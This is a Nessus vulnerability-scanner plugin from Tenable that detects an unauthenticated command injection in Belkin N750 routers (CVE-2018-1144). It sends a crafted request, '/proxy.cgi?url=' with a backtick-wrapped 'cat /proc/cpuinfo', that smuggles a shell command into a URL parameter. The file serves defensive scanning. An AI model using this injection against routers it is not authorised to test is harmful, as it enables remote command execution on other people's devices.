#
# (C) Tenable, Inc.
#

include("compat.inc");

if (description)
{
  script_id(109059);
  script_version("1.2");
  script_cvs_date("Date: 2019/11/08");

  script_cve_id("CVE-2018-1144");
  script_xref(name:"TRA", value:"TRA-2018-08");

  script_name(english:"Belkin N750 Router 1.10.22 Command Injection");
  script_summary(english:"Attempts to execute a command on the remote device.");

  script_set_attribute(attribute:"synopsis", value:
"The remote router is affected by a remote command injection
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Belkin router is affected by a remote command injection
vulnerability due to improper sanitization of user-supplied input.
An unauthenticated, remote attacker can exploit this, via a specially
crafted URL, to execute arbitrary commands on the device.

Note that Nessus has detected this vulnerability by reading the
contents of file /proc/cpuinfo");
  script_set_attribute(attribute:"solution", value:
"At time of publication, no known fix is available");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2018/04/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/04/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/o:belkin:n750_f9k1103_firmware");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2018-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("belkin_www_detect.nbin");
  script_require_keys("installed_sw/Belkin WWW");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("install_func.inc");
include("misc_func.inc");
include("http.inc");

get_install_count(app_name:"Belkin WWW", exit_if_zero:TRUE);
port = get_http_port(default:8080, embedded:TRUE);
install = get_single_install(app_name:"Belkin WWW", port:port);

exploit = "/proxy.cgi?url=`cat${IFS%?}/proc/cpuinfo`";
res = http_send_recv3(method: "GET",
                      item: exploit,
                      port: port,
                      exit_on_fail:TRUE);

if ("200 OK" >!< res[0] || "cpu model" >!< res[2])
{
  audit(AUDIT_HOST_NOT, "an affected Belkin device");
}

security_report_v4(port: port,
  severity: SECURITY_HOLE,
  generic: TRUE,
  cmd: "cat /proc/cpuinfo",
  request: make_list(build_url(qs:exploit, port:port)),
  output: chomp(res[2]));
